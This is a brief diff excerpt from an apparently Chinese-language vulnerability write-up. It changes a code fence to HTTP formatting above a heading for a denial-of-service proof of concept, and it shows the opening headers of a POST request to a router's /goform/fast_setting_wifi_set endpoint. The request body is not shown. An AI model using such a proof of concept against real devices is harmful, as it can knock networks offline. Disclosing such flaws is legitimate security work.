@@ -24,7 +24,7 @@
 
 拒绝服务的Poc：
 
-```
+```http
 POST /goform/fast_setting_wifi_set HTTP/1.1
 Host: 192.168.2.1
 Connection: close
